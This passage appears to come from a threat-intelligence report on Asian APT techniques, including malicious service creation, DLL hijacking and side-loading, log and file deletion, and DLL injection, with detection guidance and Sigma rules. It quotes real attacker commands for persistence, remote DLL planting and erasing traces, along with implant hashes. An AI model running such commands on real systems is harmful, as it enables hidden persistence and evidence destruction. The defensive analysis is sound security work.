Shell. The following suspicious files were detected:\n\n\nC:\\inetpub\\wwwroot\\aspnet_client\\supp0rt.aspx\nC:\\inetpub\\wwwroot\\aspnet_client\\Procdump.exe\nC:\\inetpub\\wwwroot\\aspnet_client\\we1come.aspx\n\n\n###### Detection\n\nThe primary way to detect a Web Shell is to track the startup of a command shell from a web service process.\nFor example,\n\n\nParent_image_path: “С:\\Windows\\System32\\inetsrv\\w3wp.exe”\nImage_path: “С:\\Windows\\System32\\cmd.exe”\n\n\nInstead of cmd.exe, the attackers can use other executable files. Explore the capability to detect the startup\nof executable files that are not normally started from a web service process. For example, running the whoami\ncommand is very unusual for a web service process, but attackers often use this command to check system\npermissions. Therefore, you can create a rule that detects this sort of behavior.\n\nIn addition, you can track the creation of new files in a web directory.\n\nYou must also monitor web service logs to look for anomalous requests, such as unusual User Agent or\nReferrer requests in an HTTP header.\n\n\n-----\n\n###### Event source Log Event ID\n\nWindows Security 4688\n\nSysmon Sysmon 1\n\n###### SIGMA rules\n\n- Sigma-Generic-Windows Shell Start by Web Applications\n\n\n-----\n\n##### Privilege Escalation TA0004\n\n###### Create or Modify System Process T1543\n\n Basic description\n\nAfter the operating system is loaded, services are started. These services are essentially processes that\nperform system functions in the background. APT actors may create or modify services to repetitively execute\nmalicious payloads for privilege elevation and persistence.\n\nServices can be used to configure the execution of malicious code at system startup or at a repeated interval\nto ensure persistence.\n\nServices can be created with administrator privileges and then run with SYSTEM privileges, which is how\nattackers can achieve privilege elevation.\n\n\n-----\n\n###### Create or Modify System Process: Windows Service T1543.003\n\n\n###### Basic description\n\nThreat actors mostly use Windows services to elevate their privileges, including for persistence in the system.\nWith local administrator rights, an attacker can create a service that will be run under the NT AUTHORITY\\\nSYSTEM account.\n\nWindows services are processes that are managed via the Service Control Manager (SCM), which starts,\nstops, suspends, and resumes services. Information about services is stored in the Windows registry:\n\n\nHKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Services\n\n\nIn this registry tree, each service has its own subkey containing configuration settings such as the service\nname, description, executable file path, task type, and other settings.\n\nNormally, the sc.exe utility for interaction with the SCM is used to create a new service or modify an existing\nservice:\n\n\nsc <server> create <service_name> <option1> <option2>\nsc <server> config <service_name> binpath= “<path_to_executable>”\n\n\nAsian APT groups usually modify the registry for this purpose. A service can be created by adding a new\nregistry key to the Services tree:\n\n\nreg add \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\<service_name>\" /v ImagePath /d \"C:\\evil.exe\"\n\n\n-----\n\nA very popular technique among Asian APT groups is to add a service that runs in the context of svchost.exe.\nFor the service running in the context of svchost.exe, they usually specify a ServiceDLL parameter containing\nthe path to the DLL file that implements the service and will be loaded into the svchost.exe process specified\nin ImagePath:\n\n\nHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\<service_name>\\ImagePath:\n“%systemroot%\\system32\\svchost.exe -k <service_group>”\nHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\<service_name>\\Parameters\\\nServiceDll: “<path_to_dll_file>”\n\n\n###### Examples of procedures\n\n**Example 1**\n\nAsian APT groups typically create a malicious service that runs in the context of the svchost.exe process.\n\nAs mentioned in the description of the first incident, attackers added the SQLReader service name to the\nregistry key HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Svchost\\\n**netsvcs and specified the path to the DLL in the corresponding registry key of the SQLReader service:**\n\n\nreg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Svchost\" /v\nnetsvcs /t REG_MULTI_SZ /d AeLookupSvc\\0 ... \\0SQLReader\nsc create SQLReader binpath= \"С:\\Windows\\System32\\svchost.exe -k netsvcs\" start= auto\ndisplayname= \"SQL Server VSS Reader\"\nreg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\SQLReader /v Description /t\nREG_SZ /d \"SQL Server VSS Reader\"\nreg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\SQLReader\\Parameters /v\nServiceDll /t REG_EXPAND_SZ /d \"С:\\Windows\\System32\\sqlrder.dll\"\nsc start SQLReader\n\n\n**Example 2**\n\nToddyCat actively used various persistence methods, including Create or Modify System Process:\n**Windows Service T1543.003. While concealing their malicious services in the context of the svchost.exe**\nprocess, they also added a new service name to fontcsvc and specified the ServiceDLL:\n\n\nRegistry key: HKLM\\System\\ControlSet001\\Services\\FontCacheSvc\\Parameters\\ServiceDll\nRegistry value: C:\\Program Files\\Common Files\\System\\apibridge.dll\nMD5: BB08CAE5C2C741BC040C9EC6E046BCAC\n\n\n-----\n\nThe service was created remotely by using the sc create command:\n\n\nsc \\\\<remote_hostname> create FontCacheSvc binpath= “С:\\Windows\\system32\\svchost.exe\n-k fontcsvc”\n\n\n**Example 3**\n\nThere is another example of creating a service in the context of svchost.exe disguised as the Windows\nPush Notification Service. The legitimate variant has 5 random characters at the end (for example,\nWpnUserService_562df), which makes it easier for an attacker to conceal a malicious service.\n\n\nService_name: WpnUserService_2727f.dll\nС:\\Windows\\System32\\svchost.exe -k WpnUserService_2727f\n\n\n**Example 4**\n\nIn addition to services in the context of svchost.exe, we also encountered legitimate executable files running\nas services used to side-load a malicious library (the DLL Side-loading technique). When alerted to the creation\nof a service, SOC analysts check the executable file of the service and may overlook malicious activity if the\nname and hash of the executable file are legitimate.\n\nFortunately, we saw that the service was created from a remote host, which is definitely suspicious:\n\n\nsc \\\\<remote_hostname> create ct binpath= “С:\\Windows\\system32\\vlc.exe start”\nsc \\\\<remote_hostname> create VLCMediaSvc binpath= “\"C:\\Program Files\\Common Files\\VLCMedia\\\nvlc.exe\" service”\n\n\n**Example 5**\n\nIn another example, we also encountered the DLL Side-loading technique while observing the creation of a\nservice. In this case, a legitimate file was specified as the executable file of the service:\n\n\nsc create \"server power\" binpath= \"С:\\Windows\\system32\\cmd.exe /c\nstart С:\\Windows\\Help\\help\\MEUpdate.exe\"\n\n\n-----\n\n**Example 6**\n\nAnother pattern observed among Asian APT groups is their tendency to delete and rewrite a service.\n\nIn this example, a BAT file is run with system privileges to create a service using the sc command, and\nthe net.exe utility is started. Notably, the attackers changed the standard function ServiceMain to the\nGetPrivateContextsPerfCounters function.\n\n\n\"С:\\Windows\\system32\\cmd.exe\" /c “C:\\Windows\\temp\\_lpih.bat C:\\Windows\\temp\\sessionenv.dll”\nsc delete \"SessionEnvSvc\"\nreg delete \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SvcHost\" /v \"SessionEnvSvc\"\n/f\nreg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SvcHost\" /v \"SessionEnvSvc\" /t\nREG_MULTI_SZ /d \"SessionEnvSvc\" /f\nsc create \"SessionEnvSvc\" binPath= \"$system32\\svchost.exe -k SessionEnvSvc\" type= share start=\nauto error= ignore DisplayName= \"Remote Desktop Configuration Manager\"\nreg add \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\SessionEnvSvc\\Parameters\" /v \"ServiceDll\" /t\nREG_EXPAND_SZ /d \"$windir\\AppPatch\\sessionenv.dll\" /f\"\nreg add \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\SessionEnvSvc\\Parameters\" /v \"ServiceMain\" /t\nREG_SZ /d \"GetPrivateContextsPerfCounters\" /f\" - changing default name of ServiceMain\nnet start \"SessionEnvSvc\"\n\n\n**Example 7**\n\nWe encountered similar activity when analyzing an incident in Kyrgyzstan in which a BAT file was run on a host\nremotely using WMI.\n\nIn contrast to the previous example, here the attackers add a value defining actions to be taken in response\nto errors (FailureActions). However, just like in the previous example, they change the standard function\nServiceMain to another function (CreateConfigStream in this case).\n\n\ncmd /c c:\\programdata\\saL_L.bat c:\\programdata\\fdeploy.dll\nsc stop \"AudioSrvSrv\"\nsc delete \"AudioSrvSrv\"\nreg delete \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SvcHost\" /v \"AudioSrvSrv\" /f\nreg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SvcHost\" /v \"AudioSrvSrv\" /t\nREG_MULTI_SZ /d \"AudioSrvSrv\" /f\nsc create \"AudioSrvSrv\" binPath= \"$system32\\svchost.exe -k AudioSrvSrv\" type= share start= auto\nerror= ignore DisplayName= \"Windows Audio Manager\"\nreg add \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\AudioSrvSrv\" /v \"FailureActions\" /t REG_\nBINARY /d \"0000000000000000000000000300000014000000010000000000000001000000\n000000000100000000000000\" /f\nreg add \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\AudioSrvSrv\\Parameters\" /v \"ServiceDll\" /t\nREG_EXPAND_SZ /d \"$system32\\wbem\\audiosrv.dll\" /f\nreg add \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\AudioSrvSrv\\Parameters\" /v \"ServiceMain\" /t\nREG_SZ /d \"CreateConfigStream\" /f\nnet start \"AudioSrvSrv\"\n\n\n-----\n\n###### Detection\n\nAlthough it is rather easy to track the creation of a new service, this activity is generated by most legitimate\napplications. Therefore, each organization must ensure thorough filtering of the applications that are used in\ntheir organization.\n\nThe primary way to detect this technique is to monitor any modifications made to the Services tree of the\nWindows registry, including the following:\n\n- Changes to the ImagePath parameter value\n\n- Changes to the ServiceDLL parameter value\n\nWhatever method the attacker uses, the creation of a new service is reflected in the Services registry tree.\n\nHowever, if an attempt to create a service was unsuccessful, we will not see this failure in the registry. Even\nthough the service was not created, attempts to create one cannot be ignored, so you are advised to track the\ncreation of services via the command line, including the following events:\n\n- Creation or modification of a service via sc.exe\n\n- Creation or modification of a service via reg.exe\n\n- Creation or modification of a service via PowerShell, and Win API calls, for example, in EPP/EDR solutions\n\nPlease keep in mind that legitimate software often creates Windows services to ensure proper functioning of\nthe application. Malicious services typically have their executable files in shared directories, while legitimate\nsoftware is usually run from the Program Files directory.\n\n###### Event source Log Event ID\n\nWindows Security 4688\n\nSysmon Sysmon 1, 13\n\nMicrosoft-Windows-PowerShell/\nPowerShell 4103, 4104\nOperational\n\n\n-----\n\n###### SIGMA rules\n\n   - Sigma-Generic-Windows Service Creation or Modification via sc.exe\n\n   - Sigma-Generic-Remote Windows Service Creation or Modification via sc.exe\n\n   - Sigma-Generic-Windows Service Creation or Modification via PowerShell.exe\n\n   - Sigma-Generic-Service manipulations via net.exe\n\n   - Sigma-Generic-Windows Service Creation from non-system directory via Registry\n\n   - Sigma-Genetic-Modification of SvcHost Group in Registry\n\n   - Sigma-Generic-Windows Service Path Modification in Registry\n\n\n-----\n\n##### Defense Evasion TA0005\n\n###### Hijack Execution Flow T1574\n\n Basic description\n\nThe Hijack Execution Flow technique allows an attacker to capture an execution thread and get their code\nto run in the context of a legitimate process. An attacker often gets this opportunity due to the specific\nfeatures of operating system programs (for example, the system can independently find a DLL to load into a\nprocess even if the developer did not specify the complete path to it in the code). These special features of an\noperating system are often ignored during application development.\n\nThe MITRE ATT&CK framework distinguishes the following Hijack Execution Flow sub-techniques for Windows:\n\n   - DLL Search Order Hijacking\n\n   - DLL Side-Loading\n\n   - Executable Installer File Permissions Weakness\n\n   - Path Interception by PATH Environment Variable\n\n   - Path Interception by Search Order Hijacking\n\n   - Path Interception by Unquoted Path\n\n   - Services File Permissions Weakness\n\n   - Services Registry Permissions Weakness\n\n   - COR_PROFILER\n\n   - KernelCallbackTable\n\nHowever, these do not include a subtechnique for a situation in which a replaceable DLL is not present in the\nsystem. For example, application A.exe attempts to load the a.dll library from a directory, but this DLL is missing\nfrom the system. In this case, the attacker can ensure that their code is executed by creating a library named\na.dll with their own payload in the specified directory. This is known as Phantom DLL Hijacking in the security\ncommunity.\n\nAside from situations in which attackers are able to create a DLL that didn’t exist in the system, attackers can\nalso use other methods to intercept a control thread. In addition to simple code execution, attackers often use\na legitimate documented capability called Windows DLL Redirection to ensure that an application continues to\nwork even after a malicious library is loaded into it. DLL Redirection lets you redirect an execution thread to a\nlegitimate DLL after code is executed from a loaded/malicious library:\n\n###### 1\n\nAn application calls a specific function from the malicious DLL while “assuming” that the library is legitimate.\n\n\n-----\n\n###### 2\n\nIf an application calls a function that is implemented in a malicious DLL by an attacker, the attacker's code\nis executed, then execution of the function is redirected to a legitimate library. For example, it is directly\nloaded into the address space of a process (LoadLibrary), then the address of the original legitimate function\n(GetProcAddress) is found. This function is then executed.\n\n###### 3\n\nIf a different function is called, execution is simply redirected to a legitimate DLL.\n\nWhen creating a DLL, the actor indicates that it must export specific functions and redirect their execution to\nthe original library, which the attacker usually renames.\n\n###### The add_numbers and ordinals_test functions in ProxyLib.dll are\nFigure 46\n###### redirected to the identically named functions in SimpleLib_1.dll\n\n\n-----\n\n###### Hijack Execution Flow: DLL Search Order Hijacking T1574.001\n\n\n###### Basic description\n\nThreat actors often use this method to load a malicious DLL into a legitimate process according to the\nstandard procedure for searching for DLLs in a Windows operating system. When attempting to load a specific\nlibrary into the address space of a process, the Windows OS checks for it in the following directories:\n\n\nDirectory containing the\nexecutable file of the running\napplication\n\n###### 4\n\nWindows directory (for example,\nC:\\Windows\\)\n\n\nSystem directory (for example,\nC:\\Windows\\System32\\)\n\n###### 5\n\nCurrent directory\n\n\n16-bit system directory (for\nexample, C:\\Windows\\System\\)\n\n###### 6\n\nDirectories listed in the PATH\nenvironment variable\n\n\nIf an attacker has permissions to write to a directory located higher on the list than the directory containing\nthe legitimate DLL, they can drop a malicious library into it. In this case, the attacker’s DLL will be loaded into\nthe process. This technique is often accompanied by the use of DLL Redirection to avoid errors and prevent\nthe process from crashing.\n\n###### Examples of procedures\n\nIn an attack on the entitites in the APAC region at the end of October of 2022, attackers made several\nattempts to use the DLL Hijacking technique:\n\n**MSDTC**\n\nKnown misconfiguration of MSDTC (Distributed Transaction Coordinator). MSDTC is a Windows service\nresponsible for coordinating transactions between databases (SQL Server) and a web server. When started, it\nattempts to find and load the following three libraries:\n\n- oci.dll\n\n- SQLLib80.dll\n\n- xa80.dll\n\n\n-----\n\nThe oci.dll library is not present in the standard distribution of Windows. This provides the opportunity for\nattackers with local administrator rights on a host to create a malicious oci.dll and execute code from it by\nstarting a service.\n\nAn Asian APT group copied a malicious library to the directory %SystemRoot%\\System32\\oci.dll on a host and\nstarted the Distributed Transaction Coordinator service using sc.exe:\n\n\nsc start msdtc\n\n\n**IKEEXT**\n\nIn the second case, malicious code was located in the C:\\Windows\\System32\\wlbsctrl.dll library, which was\nloaded into a process when the IKEEXT service started. The wlbsctrl.dll library is absent from the standard\ndistribution of Windows OS. We presume that the attackers transferred a malicious DLL from a remote host so\nthat they could implement DLL Search Order Hijacking to move laterally through the network.\n\nActors do this by using Service Control Manager and the console-based utility for working with it (sc.exe).\nAttack sequence:\n\nOn the remote machine, sc.exe is used to stop the target service, which is most often IKEEXT or SessionEnv\n\n\nsc.exe \\\\TARGET stop IKEEXT\n\n\nA DLL with a malicious payload is copied to the system directory of the remote host. The library name\nmatches the names of DLLs that the service attempts to load (IKEEXT attempts to load wlbsctrl.dll\n(MD5:04BDD31D97C4E49720F2B117562639C0), and SessionEnv attempts to load TSMSISrv.dll and\nTSVIPSrv.dll)\n\n\ncopy wlbsctrl.dll \\\\TARGET\\C$\\Windows\\System32\\wlbsctrl.dll\n\n\n-----\n\nAs the last step, the attackers start the service on the remote host, and the service automatically loads the\nmalicious DLL.\n\n\nsc.exe \\\\TARGET start IKEEXT\n\n\nAfter the attackers were able to execute the code of wlbsctrl.dll in the address space of the svchost.exe\nprocess, it made a DNS request to resolve the malicious domain boxilv.metuboss[.]com. Then the child process\ncmd.exe was created by svchost.exe.\n\n###### Detection\n\nAlthough it can be difficult to manually detect DLL Hijacking, you can use an EPP solution. You can also take\nseveral actions to help in the detection:\n\n###### System profiling\n\nA system profile is compiled by determining what is normal for a system and what is abnormal for the system.\n\nThis is a continual process that is complicated by additional software installed on hosts. However, you can\ndistinguish the common locations or applications that are exposed to DLL Hijacking attacks most often. For\nexample, standard executable files in the System32 and SysWOW64 directories are prone to these attacks.\n\nOne way to generate a profile on the executable files in these directories is to run them from a non-standard\nlocation on the system (for example, C:\\Temp) and use tools such as ProcMon to view the events that occur.\nThis will help find out which DLLs are missing from the system and identify the applications that load DLLs\nbased on a relative path. The latter is used by attackers to conduct DLL Side-loading attacks. Likewise, it\nis also advisable to copy the DLLs loaded by an executable file into a non-standard directory to see what\nhappens and identify this type of vulnerability.\n\nThe next step is to write correlation rules based on the data you obtained:\n\na. Loading a DLL that is absent from the system (Phantom DLL Hijacking)\nb. Loading a standard DLL from a non-standard directory (Search Order Hijacking, DLL Side-Loading)\nc. Loading a standard executable file from a non-standard directory (DLL Side-Loading, Masquerading)\n\n\n-----\n\n###### Monitoring research and vulnerabilities\n\nThe security community frequently publishes data on newly detected applications that are vulnerable to DLL\nHijacking. By monitoring this data, you can do the following:\n\na. Write correlation rules to quickly detect a new procedure.\nb. Run the Threat Hunting process to confirm or disprove that a system was compromised using this\nprocedure.\nc. Enrich the knowledge base of the DFIR team, which can simplify the search for artifacts on a compromised\nsystem, especially if DLL Hijacking is typical for the group that conducted the attack.\n\n###### Monitoring attack reports\n\nThis pertains to much more than just DLL Hijacking. Data obtained from these reports not only helps SOC, TH,\nand DFIR teams, but also enriches the Cyber Threat Intelligence knowledge base with information about the\nuse of specific techniques by attackers and the procedures that were employed.\n\n###### SIGMA rules\n\n   - Sigma-Generic-IKEEXT service DLL Hijacking\n\n   - Sigma-Generic-SessionEnv service DLL Hijacking\n\n\n-----\n\n###### Hijack Execution Flow: DLL Side-Loading T1574.002\n\n\n###### Basic description\n\nWhen using the DLL Side-Loading subtechnique (sometimes called Relative Path DLL Hijacking), an attacker\nbrings in their own executable files of applications that are often legitimate but vulnerable to DLL Hijacking\ntogether with malicious DLLs and then run a file. This leads to execution of code from the malicious DLL in\nthe context of a legitimate process whose image is the executable file brought in by the attacker. DLL SideLoading is very popular among attackers because it lets them take advantage of DLL Search Order Hijacking\nand avoid dependencies on the particular software installed in the victim's infrastructure.\n\nThe attack procedure is simple:\n\n###### 1\n\nFind an application that is vulnerable to DLL Hijacking (usually a legitimate application with a valid signature)\n\n###### 2\n\nThe attacker copies this application together with the malicious DLL to a directory on the victim's machine\nwhere the attacker has write permissions.\n\n###### 3\n\nThe attacker starts the copied application and the malicious DLL is loaded into the virtual address space of\nthe running process. This way, the attacker gets to execute code in the context of a legitimate process.\n\n###### Examples of procedures\n\n**Example 1**\n\nAsian APT groups use the DLL Side-loading technique very often. In an attack targeting an organization in\nIndonesia, attackers used an application called meupdate.exe, which is vulnerable to DLL Hijacking. They\ncopied this application into the directory %SystemRoot%\\help\\help\\meupdate.exe together with a malicious\nlibrary named msedgeupdate.dll. After the application was started, the malicious DLL was loaded into the\naddress space of the meupdate.exe process. Then the malicious code created the svchost.exe process (see\nProcess Hollowing).\n\n**Example 2**\n\nIn an attack targeting a Malaysian organization, attackers used the popular legitimate application VLC\nMedia Player, which was put into a directory together with a malicious library. After the application\nwas started, a malicious DLL was loaded into its address space. This DLL was named libvlc.dll (MD5:\nCBE5AEB8D809C4E09C7C2B7705C35F95).\n\n\n-----\n\nCommand_line: “C:\\Program Files\\Common Files\\VLCMedia\\vlc.exe service”\n\n**Example 3**\n\nSide-loading enabled an Asian APT group to execute code from a malicious DLL named sqlite.dll in the\ncontext of a service. As a result, the acrobroker.exe process was started with the command-line option \"--i\".\nThe malicious DLL was loaded into a new process and initiated startup of netsh.exe. Then code was injected\ninto this process. After the code injection, the netsh.exe process connected to the attackers' administrative\ncontrol console at \"www.zemelya67[.]ru\" to receive commands.\n\nImplants encountered in attacks conducted by Asian threat actors:\n\n###### MD5 File name\n\nC706F39B9323D6A8BEFEFD445583D099 cclib.dll\n\nA375266904647D5F5D26613C31881385 sqlite.dll\n\nDE8804CBA58C70659134E03CADDE6146 libvlc.dll\n\nF36A6A1B48D379FFCD1A78A5FA3460D7 libvlc.dll\n\n— c:\\ProgramData\\intel\\shadercache\\colorui.dll\n\n\n-----\n\nOther files:\n\n###### MD5 File name Verdict\n\nB13C355F6A5EDC9E\ndbhelp.dll Trojan.Win32.APosT.nyb\n3067EC76D7CF04ED\n\nC19B5F9BF1CD6BC5\nmpclient.dll Trojan.Win64.Agentb.bvf\nC9F9EE554B0C2665\n\nc:\\Program Files\\nvidia corporation\\\n\n2358CA2BE24DD767\n\nnvstreamsrv\\steamlauncher\\ Backdoor.Win64.MysterySnail.c\n\nF4997C315203B7AA\n\nsupporttool\\cryptbase.dll\n\nB65F28835D13F17E C:\\Users\\User\\AppData\\Local\\cef\\ Backdoor.\nD7EAC5EEB0D4C662 cryptbase.dll Win64.MysterySnail.e\n\n**Example 4**\n\nIn another attack, an Asian APT group used Side-loading for code execution that was less noticeable. The\nmalicious DLL C:\\ProgramData\\oracle\\mpsvc.dll was loaded into the process C:\\ProgramData\\oracle\\taskhost.\nexe, which was started while running a postponed task (the parent process was C:\\Windows\\System32\\\ntaskeng.exe). After it is loaded, the malicious DLL initiates startup of the msiexec.exe process. Asian threat\nactors often execute their payload in the context of this process.\n\nImplants also encountered in attacks conducted by Asian threat actors:\n\n###### MD5 Path\n\nBB02A5D3E8807D7B13BE46AD478F7FBB c:\\ProgramData\\intel\\wireless\\cclib.dll\n\n7332710D10B26A5970C5A1DDF7C83FBA c:\\ProgramData\\oracle\\mpsvc.dll\n\n\n-----\n\nBelow are some examples of libraries that attackers loaded into legitimate processes using the Side-loading\ntechnique:\n\n###### MD5 File name\n\n11955356232dcf6834515bf111bb5138 McUtil.dll\n\n149f35aaa7f6c065e7562850d6968683 McUtil.dll.\n\naa7231904a125273f5e5ee55a1441ba4 TmDbgLog.dll\n\n87AA0BEDF293E9B16A93E4411353F367 hccutils.dll\n\n###### Detection\n\nApproaches to detecting DLL Hijacking are described in Hijack Execution Flow: DLL Search Order Hijacking\n**T1574.001.**\n\n\n-----\n\n###### Indicator Removal T1070\n\n\n###### Basic description\n\nAfter achieving their objectives or during an attack, threat actors try to delete traces of their presence in the\ninfrastructure. Entries in files (usually event logs) may be created automatically at the OS level depending on\nthe actions of attackers and/or their tools. SOC analysts track these indicators in the telemetry received from\nthe host and respond to alerts.\n\nWhen indicators are deleted, it becomes extremely difficult if not impossible for threat researchers or security\nexperts to detect and investigate an infection. This helps attackers avoid detection and maintain access to the\ninfected system or exploit it for other unlawful purposes.\n\n\n###### Indicator Removal T1070\n\n Basic description\n\nAfter achieving their objectives or during an attack, threat actors try to delete traces of their presence in the\ninfrastructure. Entries in files (usually event logs) may be created automatically at the OS level depending on\nthe actions of attackers and/or their tools. SOC analysts track these indicators in the telemetry received from\nthe host and respond to alerts.\n\nWhen indicators are deleted, it becomes extremely difficult if not impossible for threat researchers or security\nexperts to detect and investigate an infection. This helps attackers avoid detection and maintain access to the\ninfected system or exploit it for other unlawful purposes.\n\n\n-----\n\n###### Indicator Removal: File Deletion T1070.004\n\n\n###### Basic description\n\nMalware and various tools may leave entries in event logs or in temporary files and therefore indicate\nsuspicious behavior on the network or directly on the victim's machine. These files are often deleted for the\npurpose of covering the tracks of attackers in the system.\n\nAlthough operating systems have standard commands that let you delete files, attackers may also use their\nown tools. Examples of \"native\" commands in Windows are the command \"del\".\n\n###### Examples of procedures\n\n**Example 1**\n\nAttackers deleting traces of their presence after exfiltration of data to an external server:\n\n\ncmd.exe /c C: & cd\\ & cd \"\" & del \\\\<ip>\\c$\\windows\\temp\\temp.txt\ncmd.exe /c cd /d $appdata\\proDAD\\Adorage && del c.rar && dir\ncmd.exe /c cd /d $appdata\\proDAD\\Adorage && del \"kmt.xlsx\" && dir\nsc delete \"SessionEnvSvc\"\nreg delete \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SvcHost\" /v \"SessionEnvSvc\"\n/f\ncmd.exe /C del /f /q \"*\"\ncmd.exe /C del /f /q \"\\\\10.188.1.250\\C$\\windows\\help\\help\\*”\n\n\n**Example 2**\n\nIn an incident investigated by ICS CERT, after successfully infecting a system and downloading the next\nimplant, malware deleted itself via delayed execution using the ping command:\n\n\ncmd /c ping localhost & del $selfpath\n\n\n-----\n\n**Example 3**\n\nImpacket modules also delete scripts after a command is executed:\n\n%COMSPEC% /Q /c echo <command> ^> \\\\127.0.0.1\\C$\\__out 2^>^&1 > %TEMP%\\e.bat &\n%COMSPEC% /Q /c %TEMP%\\e.bat & del %TEMP%\\e.bat\n\n###### Detection\n\nThe main way to detect the Indicator Removal: File Deletion T1070.004 technique is to look for process\ncreation events that you can use to detect suspicious command-line arguments such as \"del\" in Windows.\n\nEDR solutions also monitor file deletion events. For example, the Sysmon monitoring agent can be configured\nto log events for the deletion of only executable files to reduce the volume of logs.\n\nDetection rules can be created based on creation and deletion events over a specific time interval. For\nexample, you can have a rule that is triggered when an executable file is deleted within 24 hours of its creation.\n\n###### Event source Log Event ID\n\nWindows Security 4688\n\nSysmon Sysmon 1, 11, 23, 26\n\n###### SIGMA rules\n\n   - Sigma-Generic-File Deletion Using Ping.exe\n\n\n-----\n\n###### Indicator Removal: Network Share Connection Removal T1070.005\n\n\n###### Basic description\n\nThreat actors may unmount previously mounted network folders. Mounted network folders may indicate that\nadditional systems were infected. A connection to shared network resources can be deleted by using the \"net\"\nutility.\n\n###### Examples of procedures\n\nExamples of attackers deleting traces of their presence:\n\n\nnet use \\\\<ip_address>\\ipc$ /del\nnet use * /del /y\n\n\n###### Detection\n\nThe main way to detect the technique known as Indicator Removal: Network Share Connection Removal\nT1070.005 is to look for process creation events that have suspicious command-line arguments such as \"net\nuse \\\\system\\share /delete\".\n\n###### Event source Log Event ID\n\nWindows Security 4688\n\nSysmon Sysmon 1\n\n###### SIGMA rules\n\n- Sigma-Generic-Network Share Deleted\n\n\n-----\n\n###### Process Injection T1055\n\n Basic description\n\nThe Process Injection technique enables attackers to execute code in the context of a legitimate process and\nelevate their privileges in the system, thereby making life even more difficult for security teams. Asian APT\ngroups often utilize the Process Injection technique, especially Process Hollowing. There are also other variants\nof this technique, such as DLL Injection and PE Injection.\n\nIn some cases, attackers attempt to execute their code by directly querying the address space of the target\nprocess and writing commands to it. This activity can be detected by analyzing the sequence of WinAPI\nfunctions that are used.\n\nFor example, the basic mechanism for implementing a DLL Injection attack looks as follows:\n\n###### Attacker Process Victim Process\n\n7\n\n4 1 OpenProcess() LoadLibrary(«evil.dll») evil.dll\n\n###### GetModuleHandle()\n\n5 2 VirualAllocEx()\n\n«evil.dll» evil.dll\n\n###### GetProcAddress()\n\n3 WriteProcessMemory()\n\n6 CreateRemoteThread()\n\n###### 1\n\nThe attacker's process gets the handle of the target process and injects code into this process.\n\nThe dwDesiredAccess attribute, which is a numerical representation of the required access, is passed as an\nargument to the OpenProcess function. To continue the attack, the attacker needs permissions to write to\nthe address space of the target process, and permissions to create a thread in this process. This means that\nthey need at least the following permissions: PROCESS_VM_WRITE, PROCESS_VM_READ, PROCESS_VM_\nOPERATION, PROCESS_CREATE_THREAD and PROCESS_QUERY_INFORMATION (cumulatively: 0x043A)\n\nTo avoid wasting time checking the minimal required permissions, attackers often set the value of this attribute\nto PROCESS_ALL_ACCESS.\n\n\n-----\n\nThe second step in this attack is to allocate memory in the address space of the target process. The WinAPI\n**VirtualAllocEx is used for this purpose. In contrast to VirtualAlloc, VirtualAllocEx lets you allocate memory in**\nthe address space of other processes, not just in the address space of the calling process. When this function\nis executed, it returns the pointer to the memory area allocated in the target process.\n\n###### 3\n\nThen this memory area is used to write a string containing the file system path to the DLL that the attacker\nwants to load into the process.\n\n###### 4\n\nThe next step of the attacker is to get the handle of kernel32.dll. This is a library of the Windows subsystem\nthat contains an implementation of the LoadLibrary function required for the attack[9].\n\n###### 5\n\nAfter getting the handle of kernel32.dll, the attacker finds the address of the LoadLibrary function using the\n**GetProcAddress WinAPI function.**\n\n###### 6\n\nThen the attacker creates a thread in the target process by calling the CreateRemoteThread function. This\nfunction accepts several arguments, including the following:\n\n**• hProcess is the handle of the process in which the thread is created.**\n\n- The attacker passes the handle that was obtained at step 1.\n\n**• lpStartAddress is the address of the function with which the thread begins execution. The attacker passes**\nthe address of the LoadLibrary function that was obtained at step 4. The address of functions implemented\nin kernel32.dll normally remains the same in different user processes, so the address of this function in the\nattacker's process will be the same as in the target process.\n\n**• lpParameter is the pointer to the parameters of the thread start function. The attacker uses this attribute**\nto pass the address of the memory area allocated at step 2. This memory area contains a string with the\npath of the loaded DLL in the file system.\n\n9 Steps 4 and 5 may also be performed earlier in the attack sequence\n\n\n-----\n\nCompletion of this step results in generating Sysmon Event 8 (CreateRemoteThread) which will show the\nattributes listed above.\n\nFigure 47 CreateRemoteThread event during injection into explorer.exe\n\n###### 7\n\nThe thread begins execution in the target process starting with the LoadLibrary function, which loads the\nattacker's DLL into the address space of the process. After injection into the address space of the target\nprocess, the code is executed within the DllMain function of the loaded library.\n\nThis step is reported in Sysmon Event 7 (Image loaded).\n\n\n-----\n\nFigure 48 Image Loaded event during injection into svchost.exe\n\nAlso watch out for situations in which the access token of the attacker's process has the SeDebugPrivilege in\nthe enabled state. In this case, the attacker's process can gain any access to the virtual address space of the\ntarget process (step 1). This way, the Process Injection technique can also help elevate privileges in the system.\n\nWhen UAC is enabled, the SeDebugPrivilege can reside only in a token whose Integrity Level is High or better.\n\n###### Detection\n\nLet's examine the approaches to detecting Process Injection by dividing this technique into several\nsubtechniques. For example, the Process Injection subtechnique examined in this section is called Dynamiclink Library Injection. It typically includes the following WinAPI sequence: [OpenProcess ›] VirtualAllocEx ›\n**WriteProcessMemory › CreateRemoteThread.**\n\n\n-----\n\nIn addition to the WinAPI, host telemetry (Win Events, Sysmon) may also serve as the basis for detecting this\nsubtechnique. Event 7 (Image Loaded) and Event 8 